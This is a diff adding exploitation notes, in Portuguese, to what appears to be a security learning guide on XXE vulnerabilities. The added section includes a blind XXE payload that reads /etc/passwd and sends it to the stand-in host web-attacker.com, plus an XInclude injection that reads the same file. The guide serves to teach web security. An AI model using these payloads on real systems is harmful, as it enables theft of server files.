@@ -159,4 +159,50 @@ O pesquisador recebeu $6300 por esta falha, o valor foi menor que o de 2013 pois
 
 ### Como explorar:
 
-Não há muitos segredos na exploração desta falha, esteja atento a arquivos XML que podem ser manipulados, caso os encontre e o valor seja refletido tente definir entitys externas para leitura de arquivos ou caso o não seja refletido tente injetar uma entity que faça referência a um servidor o qual você pode analisar a interação.
+Não há muitos segredos na exploração desta falha, esteja atento a arquivos XML que podem ser manipulados, caso os encontre e o valor seja refletido tente definir entitys externas para leitura de arquivos ou caso não seja refletido tente injetar uma entity que faça referência a um servidor o qual você pode analisar a interação.
+
+Também é muito usual em casos do tipo blind, o atacante passar dados na forma de parâmetro para o servidor no qual ele tem controle isto é feito usando códigos xml parecidos com este:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+Neste caso o hacker criou uma variável chamada eval, a qual declarava dinamicamente uma entity, esta fazia uma request para um servidor sob seu controle passando no parâmetro "x" o valor do arquivo "/etc/passwd".
+
+Ataques XXE também podem ser executados quando o atacante não tem total domínio do arquivo, há sites que recebem apenas partes dele, os analisam e completam no back-end; para explorar este tipo de falha existe o XInclude, o qual é um mecanismo para inclusão de itens no xml como o entity, entretanto este é usado no corpo do arquivo e não dentro da tag DOCTYPE, quando se usa esta ferramente é gerado no final um arquivo contendo toda a inclusão.
+
+Este é um exemplo de arquivo XML com XInclude:
+```xml
+<?xml version="1.0"?>
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:xi="http://www.w3.org/2001/XInclude">
+   <head>...</head>
+   <body>
+      ...
+      <p><xi:include href="licença.txt" parse="text"/></p>
+   </body>
+</html>
+```
+
+No final, caso o arquivo licença.txt contivesse esta string: "Este documento é publicado sob a Licença de Documentação Livre da GNU" seria gerado um xml com este conteúdo:
+
+```xml
+<?xml version="1.0"?>
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:xi="http://www.w3.org/2001/XInclude">
+   <head>...</head>
+   <body>
+      ...
+      <p>Este documento é publicado sob a Licença de Documentação Livre da GNU</p>
+   </body>
+</html>
+```
+
+Uma injeção maliciosa seria parecida com esta:
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
